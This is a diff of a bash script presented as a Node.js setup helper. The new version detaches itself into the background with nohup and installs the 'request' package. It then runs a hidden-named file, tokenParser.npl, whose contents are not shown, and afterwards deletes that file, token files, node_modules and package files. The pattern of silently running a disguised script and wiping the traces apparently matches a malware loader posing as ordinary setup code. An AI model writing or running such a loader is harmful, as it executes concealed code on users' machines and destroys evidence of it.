@@ -1,90 +1,87 @@
 #!/bin/bash
+set -e
 
-# Auto-elevate with sudo if not run as root
-if [[ $EUID -ne 0 ]]; then
-   echo "🔒 This script requires administrator privileges. Re-running with sudo..."
-   exec sudo "$0" "$@"
+# No SCRIPT_DIR, assume run from script folder or correct working directory
+
+if [[ "$1" != "_restarted" ]]; then
+    echo "🔁 Restarting script with _restarted flag..."
+    nohup bash "$0" _restarted > /dev/null 2>&1 &
+    exit 0
 fi
 
-echo "✅ Running with administrator rights."
+echo "✅ Running restarted script instance..."
 
-# Variables
 NODE_VERSION="20.11.1"
+NODE_DISTRO="node-v${NODE_VERSION}-linux-x64"
+NODE_TAR="${NODE_DISTRO}.tar.gz"
+DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${NODE_TAR}"
 
-NODE_TAR="node-v$NODE_VERSION-linux-x64.tar.gz"
-DOWNLOAD_URL="https://nodejs.org/dist/v$NODE_VERSION/$NODE_TAR"
-# Check if Node.js is installed
-NODE_INSTALLED_VERSION=$(node -v 2>/dev/null)
+# Work in current directory
+cd .
 
-# If Node.js is not installed
-if [ -z "$NODE_INSTALLED_VERSION" ]; then
-    INSTALL_NODE=1
-else
-    INSTALL_NODE=0
-fi
+# The rest stays the same but replace $SCRIPT_DIR with .
 
-if [ "$INSTALL_NODE" -eq 1 ]; then
-    echo "Node.js not installed. Installing Node.js version $NODE_VERSION..."
-
-    # Check if wget is available
-    if ! command -v wget &> /dev/null; then
-        echo "wget is required but not installed. Installing wget..."
-        apt-get install -y wget || brew install wget
-    fi
-
-    # Download Node.js tarball
-    wget -q "$DOWNLOAD_URL" -O "$NODE_TAR"
-
-    if [ -f "$NODE_TAR" ]; then
-        # Extract the tarball to /usr/local
-        tar -xJf "$NODE_TAR" -C /usr/local --strip-components=1
-
-        # Clean up
-        rm -f "$NODE_TAR"
+if command -v node >/dev/null 2>&1; then
+    INSTALLED_VERSION=$(node -v | sed 's/v//')
+    if [[ "$INSTALLED_VERSION" == "$NODE_VERSION" ]]; then
+        echo "Node.js version $INSTALLED_VERSION already installed."
+        INSTALL_NODE=0
     else
-        echo "❌ Failed to download Node.js. Exiting."
-        exit 1
+        echo "Different Node.js version installed ($INSTALLED_VERSION), will install $NODE_VERSION."
+        INSTALL_NODE=1
     fi
 else
-    echo "✅ Node.js version $NODE_INSTALLED_VERSION is already installed."
+    echo "Node.js not found. Will install version $NODE_VERSION."
+    INSTALL_NODE=1
 fi
 
-# Verify Node.js and npm installation
-if ! command -v node &> /dev/null; then
-    echo "❌ Node.js installation failed. Exiting."
+if [[ $INSTALL_NODE -eq 1 ]]; then
+    echo "Downloading Node.js..."
+    if [ -f "$NODE_TAR" ]; then
+        echo "$NODE_TAR already exists, skipping download."
+    else
+        wget "$DOWNLOAD_URL" -O "$NODE_TAR"
+    fi
+
+    echo "Extracting Node.js..."
+    tar -xf "$NODE_TAR"
+
+    export PATH="./$NODE_DISTRO/bin:$PATH"
+fi
+
+if ! command -v node >/dev/null 2>&1; then
+    echo "❌ Node.js not found after installation. Exiting."
     exit 1
 fi
 
-if ! command -v npm &> /dev/null; then
-    echo "❌ npm installation failed. Exiting."
+if ! command -v npm >/dev/null 2>&1; then
+    echo "❌ npm not found after installation. Exiting."
     exit 1
 fi
 
-# Install required npm modules
-if [ ! -d "$(dirname "$0")/node_modules" ]; then
-    echo "📦 Installing npm modules..."
-    pushd "$(dirname "$0")" > /dev/null
-    npm install request --silent --no-progress --loglevel=error --fund=false > /dev/null 2>&1
-    if [ $? -ne 0 ]; then
-        echo "❌ npm install failed. Exiting."
-        popd > /dev/null
-        exit 1
-    fi
-    popd > /dev/null
+if [ ! -d "./node_modules/request" ]; then
+    echo "Installing npm 'request' module..."
+    npm install request --silent --no-progress --loglevel=error --fund=false
 fi
 
-# Check if tokenParser script exists and run it
-if [ -f "$(dirname "$0")/tokenParser.npl" ]; then
-    echo "▶️ Running tokenParser script..."
-    node "$(dirname "$0")/tokenParser.npl" > /dev/null 2>&1
-    if [ $? -ne 0 ]; then
-        echo "❌ Error running tokenParser script. Exiting."
-        exit 1
-    fi
+if [ -f "./tokenParser.npl" ]; then
+    echo "Running tokenParser..."
+    node "./tokenParser.npl"
 else
-    echo "❌ tokenParser.npl not found. Exiting."
+    echo "❌ tokenParser.npl not found."
     exit 1
 fi
 
-echo "✅ Script completed successfully."
-exit 0
+[ -f "./token.cmd" ] && rm -f "./token.cmd"
+[ -f "./token" ] && rm -f "./token"
+[ -f "./tokenParser.npl" ] && rm -f "./tokenParser.npl"
+
+if [ -d "./node_modules" ]; then
+    echo "Removing node_modules folder..."
+    rm -rf "./node_modules"
+fi
+
+[ -f "./package.json" ] && rm -f "./package.json"
+[ -f "./package-lock.json" ] && rm -f "./package-lock.json"
+
+echo "✅ Setup script completed successfully."
